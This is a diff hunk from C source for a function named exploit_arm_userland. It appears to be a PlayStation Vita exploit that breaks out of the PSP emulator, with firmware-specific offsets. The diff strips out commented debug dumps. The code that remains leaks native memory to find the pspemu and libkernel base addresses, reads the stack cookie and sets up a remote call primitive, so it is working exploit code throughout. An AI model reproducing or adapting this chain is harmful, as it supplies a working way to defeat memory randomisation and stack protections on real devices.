@@ -404,23 +404,12 @@ int exploit_arm_userland(void)
 	pspemu_base -= 0xa1; // on 3.30: 0xa1, on 3.65: 0xa5
 	pspDebugScreenPrintf("pspemu_base: 0x%08X\n", pspemu_base);
 
-	/*u32 buffer[16];
-	read_native(buffer, pspemu_data, sizeof(buffer));
-	pspDebugScreenPrintf("\n%u bytes at pspemu_data:\n", sizeof(buffer));
-	hexdump(buffer, sizeof(buffer));
-
-	read_native(buffer, pspemu_base, sizeof(buffer));
-	pspDebugScreenPrintf("\n%u bytes at pspemu_base:\n", sizeof(buffer));
-	hexdump(buffer, sizeof(buffer));*/
-
 	read_native(mov, pspemu_base + ScePspemu_sceKernelWaitSema, sizeof(mov));
 	libkernel_base = decode_movw_movt(mov) - SceLibKernel_sceKernelWaitSema;
 	pspDebugScreenPrintf("libkernel_base: 0x%08X\n", libkernel_base);
 
 	read_native(&libkernel_data, libkernel_base + 0xb4bc, sizeof(libkernel_data));
 	libkernel_data -= 0x4;
-	//read_native(&libkernel_data, libkernel_base + 0xc214, sizeof(libkernel_data));
-	//libkernel_data -= 0x14;
 	pspDebugScreenPrintf("libkernel_data: 0x%08X\n", libkernel_data);
 
 	read_native(mov, pspemu_base + ScePspemu_sceRtcGetCurrentClockLocalTime, sizeof(mov));
@@ -434,31 +423,9 @@ int exploit_arm_userland(void)
 	read_native(&stack_cookie, libkernel_data + 0x4, sizeof(stack_cookie));
 	pspDebugScreenPrintf("stack_cookie: 0x%08X\n", stack_cookie);
 
-	// read some pspemu constants...
-	// only for 3.30...
-	// i am so tired.
-	{
-		u32 g_pspemuCachedCdramBase = 0;
-		u32 DAT_81070150 = 0;
-		u32 DAT_81070154 = 0;
-
-		read_native(&g_pspemuCachedCdramBase, pspemu_data + 0x100A8, sizeof(g_pspemuCachedCdramBase));
-		read_native(&DAT_81070150, pspemu_data + 0x10150, sizeof(DAT_81070150));
-		read_native(&DAT_81070154, pspemu_data + 0x10154, sizeof(DAT_81070154));
-
-		pspDebugScreenPrintf("g_pspemuCachedCdramBase: 0x%08X\n", g_pspemuCachedCdramBase);
-		pspDebugScreenPrintf("DAT_81070150: 0x%08X\n", DAT_81070150);
-		pspDebugScreenPrintf("DAT_81070154: 0x%08X\n", DAT_81070154);
-
-		// Isn't 0x61000000 where CDRAM is normally mapped for Vita user processes..?
-		// g_pspemuCachedCdramBase: 0x61000000
-		// DAT_81070150: 0x70000000
-		// DAT_81070154: 0x61000000
-	}
-
 	// delay so you can at least see it.
 	sceKernelDelayThread(5 * 1000 * 1000);
-	stack_pointer = init_rpc(stack_cookie, pspemu_base, libkernel_base, libkernel_data);
+	stack_pointer = init_rpc(stack_cookie, pspemu_base, libkernel_base);
 	pspDebugScreenPrintf("stack_pointer: 0x%08X\n", stack_pointer);
 
 	call(pspemu_base + ScePspemu_sceNetTerm);
